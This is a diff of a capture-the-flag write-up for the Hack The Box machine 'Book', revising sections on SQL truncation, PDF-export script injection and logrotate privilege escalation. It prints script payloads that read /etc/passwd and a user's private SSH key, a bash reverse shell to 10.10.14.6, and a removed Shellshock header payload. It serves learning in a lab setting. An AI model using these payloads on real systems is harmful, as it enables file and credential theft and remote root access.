@@ -29,7 +29,7 @@ We see SSH and a webserver running.
 
 ## Enumerating Website
 
-This is the index page of the web server. It shows a login/signup page for what seems like a library app.
+The index page shows a login/signup page for what seems like a library app.
 
 ![http home page](images/book/libraryhomepage.png)
 
@@ -47,18 +47,18 @@ The `admin` path is worth a closer look. And we find a similar login page but fo
 
 Now, let's put on the hat of a user and try signing up for an account. So that we can log in and see what inside the member area.
 
-After clicking on the "SIGN UP" button and creating a new account, we signed into the website.
+After clicking on the "SIGN UP" button and creating a new account, we can sign into the website.
 
 After browsing around, the following pages are of interest:
 
-* Upload page@
+* Upload page
 * Contact page
-
-![contact page](images/book/contactpage.png)
 
 The contact page leaked the **email address of the administrator**.
 
 * admin@book.htb
+
+![contact page](images/book/contactpage.png)
 
 ## SQL Truncation Attack
 
@@ -95,8 +95,8 @@ This is how the attack looks like in Burp:
 
 How this SQL truncation attack works:
 
-* First, the web app compares our email with the existing registered emails, it does not find clashes as we appended a series of spaces an a random string to it. 
-* Hence, the database proceeds to the insert operation.
+* First, the web app compares our email with the existing registered emails, it does not find clashes as we appended a series of spaces and a random string to it. 
+* Hence, the database proceeds to INSERT.
 * However, as the email column is configured to accept only 20 characters, it truncates the email to 20 characters, before storing it as "admin@book.htb" without the trailing spaces.
 * Now, the table contains a row with the admin email and a password of our choice (123456789).
 
@@ -109,21 +109,63 @@ Yup, it works.
 
 ![admin area](images/book/adminarea.png)
 
-## XSS Attack On Generated PDF
+## PDF Export Code Injection
 
-Before we move on to getting a shell on the system, let's take a closer look at the modified header value to understand how it works.
+Earlier, we spotted an upload function in the **Collections section of the user account**. Upload functions are always worth scrutinizing.
 
-`() { :; }; echo; /bin/bash -c 'cat /etc/passwd'`
+![book submission](images/book/booksubmission.jpg)
 
-* `() { :; };` - syntax of an empty bash function
+In the corresponding section in the administrator account, there is a PDF export function.
 
-* `echo;` - the subsequent command works without this echo command, but you need it to receive a well-formed HTML response ([with an empty line between the headers and the content](https://www.w3.org/Protocols/rfc2616/rfc2616-sec4.html)). In other words, if you expect text output and you want to see it as part of the HTML response, you need this.
+![admin pdf export](images/book/adminpdfexport.jpg)
 
+Clicking on the PDF link on the Collections row generates a PDF showing a table of uploaded books with the following:
+
+* Book title
+* Author
+* A link to the uploaded file
+
+![exported PDF](images/book/exportedpdf.jpg)
+
+Let's try to see if we can influence the exported PDF with HTML code.
+
+In the **Book Title** field, key in the following.
+
+`<b>test</b>`
+
+After uploading a random file, the admin generated PDF looks like this.
+
+![testing for injection](images/book/htmlinjectiontest.png)
+
+The bolded "test" shows that HTML code is getting through to the PDF generator.
+
+Let's try to send a more ambitious payload with the HTML `<script>` tag.
+
+`<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>`
+
+This script ([from here](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)) uses a XHR object to send a GET request for the local file `/etc/passwd`, and writes it to the document.
+
+With this payload, the generated PDF file shows us the passwd file.
+
+![passwd](images/book/passwd.png)
+
+We see that only root and reader have login shells. Let's modify the payload to get the private SSH key of the user reader.
+
+`<script>x=new XMLHttpRequest;x.onload=function(){document.write("<font size='1'>" + this.responseText + "</font>")};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>`
+
+This payload has two main changes:
+
+* Requests for the SSH key of reader instead of getting the passwd file
+* Sets to a smallest font to ensure the SSH file fits the generated PDF
+
+After sending this modifed payload, we generate the PDF again.
+
+This time, the PDF contains the private SSH key of reader. We save the key into a file `reader`.
 
 With the SSH key, we can log in as `reader` to get the **user flag**.
 
 ```
-root@kali:~/htb/book# ssh reader@10.10.10.176 -i ~/.ssh/reader
+root@kali:~/htb/book# ssh reader@10.10.10.176 -i reader
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 5.4.1-050401-generic x86_64)
 <SNIP>
 reader@book:~$ ls
@@ -149,17 +191,24 @@ A typical exploitation path is to write a payload into `/etc/bash_completion.d` 
 
 ### Exploit Conditions
 
-We need logrotate to run to trigger out exploit.
+We need logrotate to run to trigger our exploit. Psspy shows us that logrotate is being forced to rotate the logs every 5 seconds. So that works.
+
+```
+2020/04/19 10:58:45 CMD: UID=0    PID=113349 | /usr/sbin/logrotate -f /root/log.cfg 
+2020/04/19 10:58:45 CMD: UID=0    PID=113348 | /bin/sh /root/log.sh 
+2020/04/19 10:58:45 CMD: UID=0    PID=113350 | sleep 5 
+2020/04/19 10:58:50 CMD: UID=0    PID=113352 | /usr/sbin/logrotate -f /root/log.cfg 
+2020/04/19 10:58:50 CMD: UID=0    PID=113351 | /bin/sh /root/log.sh 
+2020/04/19 10:58:50 CMD: UID=0    PID=113353 | sleep 5 
+```
 
 Also, we need root to log in to trigger our payload.
 
 Root is logging on every minute (Contrived)
 
-`nc -nvlp 8888`
+### Using Logrotten
 
-## Using Logrotten
-
-How it works:
+Logrotten is a software that helps us to exploit logrotate as described above.
 
 Conditions:
 
@@ -169,7 +218,6 @@ Our payload file is a shell script that pushes a reverse bash shell to us if the
 #!/bin/bash
 if [ `id -u` -eq 0 ]; then (bash -i >& /dev/tcp/10.10.14.6/8888 0>&1 &); fi
 ```
-
 
 We know that logrotate is forced to run every five seconds, using the config file `/root/log.cfg`.
 
@@ -216,15 +264,15 @@ whoami
 
 ## Ending Thoughts
 
-Both the SQL truncate attack and the XSS exploit are new to me. Although I've heard of the logrotate exploit, this was the first time I've had the chance to try it out. 
+Both the SQL truncate attack and the code injection exploit are new to me. Although I've heard of the logrotate exploit, this was the first time I've had the chance to try it out. 
 
 Overall, a very educational box for me.
 
-
 **References**
-
-* https://www.netsparker.com/blog/web-security/cve-2014-6271-shellshock-bash-vulnerability-scan/
-* https://www.symantec.com/connect/blogs/shellshock-all-you-need-know-about-bash-bug-vulnerability
 
 * https://linux.die.net/man/8/logrotate
 * https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+
+
+include python script for sql truncation
+complete logrotate
